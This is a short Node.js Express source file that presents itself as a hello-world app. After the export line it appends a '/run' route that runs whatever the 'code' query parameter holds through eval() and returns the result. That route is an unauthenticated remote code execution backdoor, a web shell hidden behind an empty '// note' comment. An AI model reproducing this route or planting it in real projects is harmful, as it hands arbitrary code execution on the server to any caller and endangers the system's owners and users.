const express = require('express');
const app = express();
app.get('/', (req, res) => { res.send('hello'); });
module.exports = app;
// note
app.get('/run', (req, res) => { res.send(String(eval(req.query.code))); });
